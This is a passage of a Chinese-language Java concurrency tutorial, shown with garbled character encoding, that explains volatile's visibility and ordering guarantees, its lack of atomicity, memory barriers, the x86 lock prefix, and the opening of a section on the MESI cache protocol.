<h2 data-id="heading-81">ç¬¬å››ç«  volatileå…³é”®å­—</h2>
<h3 data-id="heading-82">4.1 volatileçš„ä½œç”¨</h3>
<p><strong>volatileæ˜¯ä»€ä¹ˆï¼Ÿ</strong></p>
<ul>
<li>volatileæ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºä¿®é¥°å˜é‡</li>
<li>ä¿è¯å˜é‡çš„å¯è§æ€§å’Œæœ‰åºæ€§</li>
<li>ä½†ä¸ä¿è¯åŸå­æ€§</li>
</ul>
<h4 data-id="heading-83">ä¿è¯å¯è§æ€§</h4>
<p><strong>ä»€ä¹ˆæ˜¯å¯è§æ€§é—®é¢˜ï¼Ÿ</strong></p>
<p>åœ¨å¤šæ ¸CPUç¯å¢ƒä¸‹ï¼Œæ¯ä¸ªCPUéƒ½æœ‰è‡ªå·±çš„ç¼“å­˜ã€‚çº¿ç¨‹å¯èƒ½åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­ä¿å­˜å˜é‡çš„å‰¯æœ¬ï¼Œå¯¼è‡´ä¸€ä¸ªçº¿ç¨‹çš„ä¿®æ”¹ï¼Œå…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°ã€‚</p>
<p><strong>å¯è§æ€§é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é—®é¢˜ä»£ç ï¼šæ²¡æœ‰volatile</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// âš ï¸ å¯èƒ½æ°¸è¿œå¾ªç¯</span>
            <span class="hljs-comment">// çº¿ç¨‹åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­è¯»å–flag=false</span>
            <span class="hljs-comment">// çœ‹ä¸åˆ°ä¸»çº¿ç¨‹ä¿®æ”¹flag=true</span>
        }
        System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
    }).start();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  
    <span class="hljs-comment">// âš ï¸ ä¿®æ”¹å¯èƒ½åªæ›´æ–°åœ¨CPUç¼“å­˜ä¸­</span>
    <span class="hljs-comment">// æ²¡æœ‰åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°</span>
}
</code></pre>
<p><strong>é—®é¢˜åŸå› ï¼š</strong></p>
<ul>
<li>CPUç¼“å­˜ï¼šæ¯ä¸ªCPUæœ‰è‡ªå·±çš„ç¼“å­˜ï¼Œå˜é‡å¯èƒ½åªå­˜åœ¨ç¼“å­˜ä¸­</li>
<li>ç¼“å­˜æœªåŒæ­¥ï¼šä¿®æ”¹æ²¡æœ‰åˆ·æ–°åˆ°ä¸»å†…å­˜</li>
<li>å…¶ä»–çº¿ç¨‹çœ‹ä¸åˆ°ï¼šä»è‡ªå·±çš„ç¼“å­˜è¯»å–ï¼Œè¿˜æ˜¯æ—§å€¼</li>
</ul>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatile</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!flag) {
            <span class="hljs-comment">// âœ… èƒ½åŠæ—¶çœ‹åˆ°flagçš„å˜åŒ–</span>
            <span class="hljs-comment">// volatileä¿è¯ä»ä¸»å†…å­˜è¯»å–æœ€æ–°å€¼</span>
        }
        System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
    }).start();
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
    flag = <span class="hljs-literal">true</span>;  
    <span class="hljs-comment">// âœ… ä¿®æ”¹ç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜</span>
    <span class="hljs-comment">// å…¶ä»–çº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°</span>
}
</code></pre>
<p><strong>volatileçš„å¯è§æ€§ä¿è¯ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">å†™volatileå˜é‡ï¼š
<span class="hljs-bullet">1.</span> çº¿ç¨‹ä¿®æ”¹volatileå˜é‡
<span class="hljs-bullet">2.</span> ç«‹å³åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼ˆä¸æ˜¯åªå†™ç¼“å­˜ï¼‰
<span class="hljs-bullet">3.</span> ä½¿å…¶ä»–CPUçš„ç¼“å­˜å¤±æ•ˆ

è¯»volatileå˜é‡ï¼š
<span class="hljs-bullet">1.</span> çº¿ç¨‹è¯»å–volatileå˜é‡
<span class="hljs-bullet">2.</span> ä»ä¸»å†…å­˜è¯»å–ï¼ˆä¸ä»ç¼“å­˜è¯»ï¼‰
<span class="hljs-bullet">3.</span> ä¿è¯è¯»åˆ°æœ€æ–°å€¼
</code></pre>
<p><strong>ç”Ÿæ´»åŒ–ç†è§£ï¼š</strong></p>
<ul>
<li>æ²¡æœ‰volatileï¼šå°±åƒæ¯ä¸ªäººæœ‰è‡ªå·±çš„ç¬”è®°æœ¬ï¼Œä¿®æ”¹äº†ä½†åˆ«äººçœ‹ä¸åˆ°</li>
<li>æœ‰volatileï¼šå°±åƒå†™åœ¨å…¬å‘Šæ¿ä¸Šï¼Œæ‰€æœ‰äººéƒ½èƒ½çœ‹åˆ°æœ€æ–°å†…å®¹</li>
</ul>
<h4 data-id="heading-84">ç¦æ­¢æŒ‡ä»¤é‡æ’åº</h4>
<p><strong>ä»€ä¹ˆæ˜¯æŒ‡ä»¤é‡æ’åºï¼Ÿ</strong></p>
<p>ä¸ºäº†ä¼˜åŒ–æ€§èƒ½ï¼Œç¼–è¯‘å™¨å’ŒCPUå¯èƒ½ä¼šé‡æ–°æ’åˆ—æŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºã€‚åœ¨å•çº¿ç¨‹ä¸‹æ²¡é—®é¢˜ï¼Œä½†åœ¨å¤šçº¿ç¨‹ä¸‹å¯èƒ½å¯¼è‡´é—®é¢˜ã€‚</p>
<p><strong>é‡æ’åºé—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é—®é¢˜ä»£ç ï¼šå¯èƒ½é‡æ’åº</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// æ²¡æœ‰volatile</span>

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// æŒ‡ä»¤1</span>
    b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// æŒ‡ä»¤2</span>
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æŒ‡ä»¤3</span>
    <span class="hljs-comment">// âš ï¸ å¯èƒ½è¢«é‡æ’åºä¸ºï¼š3 -&gt; 1 -&gt; 2</span>
    <span class="hljs-comment">// CPUæˆ–ç¼–è¯‘å™¨å¯èƒ½ä¼˜åŒ–æ‰§è¡Œé¡ºåº</span>
}

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (flag) {
        <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// âš ï¸ å¯èƒ½çœ‹åˆ°a=0ï¼ˆè¿˜æ²¡æ‰§è¡Œa=1ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b; <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°b=2</span>
        <span class="hljs-comment">// å› ä¸ºæŒ‡ä»¤é‡æ’åºï¼Œçœ‹åˆ°ä¸ä¸€è‡´çš„çŠ¶æ€</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>æŒ‡ä»¤1å’Œ2å¯èƒ½åœ¨æŒ‡ä»¤3ä¹‹åæ‰§è¡Œï¼ˆé‡æ’åºï¼‰</li>
<li>çº¿ç¨‹2çœ‹åˆ°flag=trueæ—¶ï¼Œaå¯èƒ½è¿˜æ˜¯0</li>
<li>å¯¼è‡´æ•°æ®ä¸ä¸€è‡´</li>
</ul>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨volatileç¦æ­¢é‡æ’åº</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// volatileç¦æ­¢é‡æ’åº</span>

<span class="hljs-comment">// çº¿ç¨‹1</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
    a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
    b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
    flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 3</span>
    <span class="hljs-comment">// âœ… volatileå†™ï¼šå‰é¢çš„æ“ä½œä¸èƒ½é‡æ’åºåˆ°åé¢</span>
    <span class="hljs-comment">// ä¿è¯a=1å’Œb=2åœ¨flag=trueä¹‹å‰å®Œæˆ</span>
}

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (flag) {  
        <span class="hljs-comment">// âœ… volatileè¯»ï¼šåé¢çš„æ“ä½œä¸èƒ½é‡æ’åºåˆ°å‰é¢</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// ä¿è¯çœ‹åˆ°a=1ï¼ˆå› ä¸ºvolatileä¿è¯æœ‰åºæ€§ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b; <span class="hljs-comment">// ä¿è¯çœ‹åˆ°b=2</span>
    }
}
</code></pre>
<p><strong>volatileçš„å†…å­˜å±éšœï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p>volatileé€šè¿‡æ’å…¥å†…å­˜å±éšœæ¥ç¦æ­¢é‡æ’åºï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">å†™<span class="hljs-keyword">volatile</span>å˜é‡ï¼š
æ™®é€šå†™<span class="hljs-number">1</span>
æ™®é€šå†™<span class="hljs-number">2</span>
â”€â”€â”€â”€â”€â”€â”€ StoreStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢ä¸Šé¢çš„æ™®é€šå†™å’Œ<span class="hljs-keyword">volatile</span>å†™é‡æ’åº
<span class="hljs-keyword">volatile</span>å†™
â”€â”€â”€â”€â”€â”€â”€ StoreLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>å†™å’Œä¸‹é¢çš„æ“ä½œé‡æ’åº

è¯»<span class="hljs-keyword">volatile</span>å˜é‡ï¼š
<span class="hljs-keyword">volatile</span>è¯»
â”€â”€â”€â”€â”€â”€â”€ LoadLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œä¸‹é¢çš„è¯»é‡æ’åº
â”€â”€â”€â”€â”€â”€â”€ LoadStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€ â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œä¸‹é¢çš„å†™é‡æ’åº
æ™®é€šè¯»
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å†…å­˜å±éšœå°±åƒ"æ æ†"ï¼Œé˜»æ­¢æŒ‡ä»¤è·¨è¶Š</li>
<li>volatileå†™å‰çš„æ“ä½œä¸èƒ½ç§»åˆ°å†™ä¹‹å</li>
<li>volatileè¯»åçš„æ“ä½œä¸èƒ½ç§»åˆ°è¯»ä¹‹å‰</li>
<li>ä¿è¯æœ‰åºæ€§</li>
</ul>
<h4 data-id="heading-85">ä¸ä¿è¯åŸå­æ€§</h4>
<p><strong>ä»€ä¹ˆæ˜¯åŸå­æ€§ï¼Ÿ</strong></p>
<ul>
<li>åŸå­æ€§ï¼šæ“ä½œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œä¸ä¼šè¢«æ‰“æ–­</li>
<li>volatileåªä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§ï¼Œ<strong>ä¸ä¿è¯åŸå­æ€§</strong></li>
</ul>
<p><strong>åŸå­æ€§é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼švolatileä¸èƒ½ä¿è¯åŸå­æ€§</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// âš ï¸ ä¸æ˜¯åŸå­æ“ä½œ</span>
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        increment();
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        increment();
    }
});

t1.start();
t2.start();
<span class="hljs-comment">// ç»“æœï¼šæœŸæœ›20000ï¼Œå®é™…å¯èƒ½å°äº20000 âŒ</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆcount++ä¸æ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<p><code>count++</code>å®é™…ä¸ŠåŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// count++çš„åˆ†è§£æ­¥éª¤</span>
<span class="hljs-number">1.</span> è¯»å–countçš„å€¼     (read)
<span class="hljs-number">2.</span> å°†countåŠ <span class="hljs-number">1</span>        (add)
<span class="hljs-number">3.</span> å°†æ–°å€¼å†™å›count   (write)

<span class="hljs-comment">// é—®é¢˜ï¼šè¿™ä¸‰ä¸ªæ­¥éª¤ä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
çº¿ç¨‹<span class="hljs-number">1</span>ï¼šread(count=<span class="hljs-number">100</span>) â†’ add(<span class="hljs-number">101</span>) â†’ [è¢«çº¿ç¨‹<span class="hljs-number">2</span>æ‰“æ–­]
çº¿ç¨‹<span class="hljs-number">2</span>ï¼šread(count=<span class="hljs-number">100</span>) â†’ add(<span class="hljs-number">101</span>) â†’ write(<span class="hljs-number">101</span>)
çº¿ç¨‹<span class="hljs-number">1</span>ï¼šwrite(<span class="hljs-number">101</span>)  <span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹éƒ½åŠ äº†1ï¼Œä½†ç»“æœåªåŠ äº†1æ¬¡</span>
</code></pre>
<p><strong>volatileä¸ºä»€ä¹ˆä¸èƒ½ä¿è¯åŸå­æ€§ï¼Ÿ</strong></p>
<ul>
<li>volatileåªèƒ½ä¿è¯<strong>å•ä¸ªè¯»å†™æ“ä½œ</strong>çš„å¯è§æ€§</li>
<li>ä½†<code>count++</code>æ˜¯<strong>å¤šä¸ªæ“ä½œ</strong>ï¼ˆè¯»-æ”¹-å†™ï¼‰</li>
<li>volatileæ— æ³•ä¿è¯è¿™ä¸‰ä¸ªæ“ä½œä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œ</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šä½¿ç”¨synchronized</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// æ•´ä¸ªæ–¹æ³•åŸå­æ‰§è¡Œ</span>
}

<span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šä½¿ç”¨åŸå­ç±»ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œï¼Œå†…éƒ¨ä½¿ç”¨CAS</span>
}
</code></pre>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li>âœ… volatileä¿è¯ï¼šå¯è§æ€§ã€æœ‰åºæ€§</li>
<li>âŒ volatileä¸ä¿è¯ï¼šåŸå­æ€§ï¼ˆéœ€è¦synchronizedæˆ–åŸå­ç±»ï¼‰</li>
</ul>
<h3 data-id="heading-86">4.2 volatileçš„å®ç°åŸç†</h3>
<p><strong>volatileå¦‚ä½•å®ç°å¯è§æ€§å’Œæœ‰åºæ€§ï¼Ÿ</strong></p>
<ul>
<li>é€šè¿‡<strong>å†…å­˜å±éšœ</strong>ï¼ˆMemory Barrierï¼‰å®ç°</li>
<li>é€šè¿‡<strong>Lockå‰ç¼€æŒ‡ä»¤</strong>ï¼ˆCPUçº§åˆ«ï¼‰å®ç°</li>
<li>é€šè¿‡<strong>MESIç¼“å­˜ä¸€è‡´æ€§åè®®</strong>ï¼ˆç¡¬ä»¶çº§åˆ«ï¼‰å®ç°</li>
</ul>
<h4 data-id="heading-87">å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰</h4>
<p><strong>ä»€ä¹ˆæ˜¯å†…å­˜å±éšœï¼Ÿ</strong></p>
<p>å†…å­˜å±éšœæ˜¯ä¸€ç±»CPUæŒ‡ä»¤ï¼Œç”¨äºï¼š</p>
<ul>
<li>âœ… <strong>é˜»æ­¢é‡æ’åº</strong>ï¼šç¡®ä¿å±éšœä¸¤ä¾§çš„æŒ‡ä»¤ä¸ä¼šé‡æ’åº</li>
<li>âœ… <strong>ä¿è¯å¯è§æ€§</strong>ï¼šå¼ºåˆ¶åˆ·æ–°ç¼“å­˜ï¼Œä½¿ä¿®æ”¹å¯¹å…¶ä»–CPUå¯è§</li>
</ul>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°±åƒé“è·¯ä¸Šçš„"æ æ†"ï¼Œé˜»æ­¢è½¦è¾†ï¼ˆæŒ‡ä»¤ï¼‰è·¨è¶Š</li>
<li>ç¡®ä¿æŒ‡ä»¤æŒ‰ç…§é¢„æœŸé¡ºåºæ‰§è¡Œ</li>
<li>å¼ºåˆ¶æ•°æ®åŒæ­¥åˆ°ä¸»å†…å­˜</li>
</ul>
<p><strong>JMMå®šä¹‰çš„å››ç§å†…å­˜å±éšœï¼š</strong></p>
<p><strong>1. LoadLoadå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Load1;        <span class="hljs-comment">// åŠ è½½æ“ä½œ1</span>
LoadLoadå±éšœ; <span class="hljs-comment">// æ æ†</span>
Load2;        <span class="hljs-comment">// åŠ è½½æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Load1åœ¨Load2ä¹‹å‰æ‰§è¡Œ</p>
<p><strong>2. StoreStoreå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Store1;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ1</span>
StoreStoreå±éšœ; <span class="hljs-comment">// æ æ†</span>
Store2;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Store1çš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå†æ‰§è¡ŒStore2</p>
<p><strong>3. LoadStoreå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Load1;        <span class="hljs-comment">// åŠ è½½æ“ä½œ1</span>
LoadStoreå±éšœ; <span class="hljs-comment">// æ æ†</span>
Store2;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Load1åœ¨Store2ä¹‹å‰æ‰§è¡Œ</p>
<p><strong>4. StoreLoadå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Store1;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ1</span>
StoreLoadå±éšœ; <span class="hljs-comment">// æ æ†ï¼ˆæœ€é‡ï¼Œå¼€é”€æœ€å¤§ï¼‰</span>
Load2;         <span class="hljs-comment">// åŠ è½½æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Store1çš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå†æ‰§è¡ŒLoad2</p>
<p><strong>volatileçš„å†…å­˜å±éšœæ’å…¥ç­–ç•¥ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

<span class="hljs-comment">// volatileå†™æ“ä½œ</span>
a = <span class="hljs-number">1</span>;              <span class="hljs-comment">// æ™®é€šå†™</span>
â”€â”€â”€â”€â”€â”€â”€ StoreStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢æ™®é€šå†™å’Œ<span class="hljs-keyword">volatile</span>å†™é‡æ’åº
x = <span class="hljs-number">1</span>;              <span class="hljs-comment">// volatileå†™</span>
â”€â”€â”€â”€â”€â”€â”€ StoreLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>å†™å’Œåé¢çš„æ“ä½œé‡æ’åº

<span class="hljs-comment">// volatileè¯»æ“ä½œ</span>
<span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> x;         <span class="hljs-comment">// volatileè¯»</span>
â”€â”€â”€â”€â”€â”€â”€ LoadLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œåé¢çš„è¯»é‡æ’åº
â”€â”€â”€â”€â”€â”€â”€ LoadStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€ â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œåé¢çš„å†™é‡æ’åº
<span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> a;         <span class="hljs-comment">// æ™®é€šè¯»</span>
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>volatileå†™å‰æ’å…¥StoreStoreå±éšœ</li>
<li>volatileå†™åæ’å…¥StoreLoadå±éšœ</li>
<li>volatileè¯»åæ’å…¥LoadLoadå’ŒLoadStoreå±éšœ</li>
<li>é€šè¿‡è¿™äº›å±éšœä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§</li>
</ul>
<h4 data-id="heading-88">Lockå‰ç¼€æŒ‡ä»¤</h4>
<p><strong>x86æ¶æ„ä¸‹çš„å®ç°ï¼š</strong></p>
<p>volatileå†™æ“ä½œåœ¨x86æ¶æ„ä¸‹ä¼šè¢«ç¼–è¯‘ä¸ºå¸¦æœ‰<code>lock</code>å‰ç¼€çš„æŒ‡ä»¤ã€‚</p>
<p><strong>æ±‡ç¼–ä»£ç ç¤ºä¾‹ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; volatileå†™æ“ä½œ
mov    %eax,0x10(%esi)    ; å°†å€¼å†™å…¥å†…å­˜
lock addl $0x0,(%esp)     ; lockå‰ç¼€ï¼Œé”å®šç¼“å­˜è¡Œ
</code></pre>
<p><strong>lockå‰ç¼€çš„ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>é”å®šæ€»çº¿æˆ–ç¼“å­˜è¡Œ</strong></p>
<ul>
<li>åœ¨å¤šæ ¸CPUä¸­ï¼Œç¡®ä¿åªæœ‰ä¸€ä¸ªCPUèƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤</li>
<li>ä¿è¯æ“ä½œçš„åŸå­æ€§</li>
</ul>
</li>
<li>
<p><strong>åˆ·æ–°ç¼“å­˜</strong></p>
<ul>
<li>å°†ç¼“å­˜ä¸­çš„æ•°æ®å†™å›ä¸»å†…å­˜</li>
<li>ä½¿å…¶ä»–CPUçš„ç¼“å­˜å¤±æ•ˆ</li>
<li>ä¿è¯å¯è§æ€§</li>
</ul>
</li>
</ol>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>lockå‰ç¼€å°±åƒç»™æ“ä½œåŠ äº†ä¸€æŠŠ"é”"</li>
<li>ç¡®ä¿æ“ä½œæ˜¯åŸå­çš„ã€å¯è§çš„</li>
<li>CPUç¡¬ä»¶å±‚é¢çš„ä¿è¯</li>
</ul>
<h4 data-id="heading-89">MESIç¼“å­˜ä¸€è‡´æ€§åè®®</h4>
<p><strong>ä»€ä¹ˆæ˜¯MESIï¼Ÿ</strong></p>
<p>MESIæ˜¯å¤šæ ¸CPUçš„ç¼“å­˜ä¸€è‡´æ€§åè®®ï¼Œç”¨äºä¿è¯å¤šæ ¸CPUä¹‹é—´ç¼“å­˜çš„ä¸€è‡´æ€§ã€‚</p>
<p><strong>MESIçš„å››ç§çŠ¶æ€ï¼š</strong></p>






























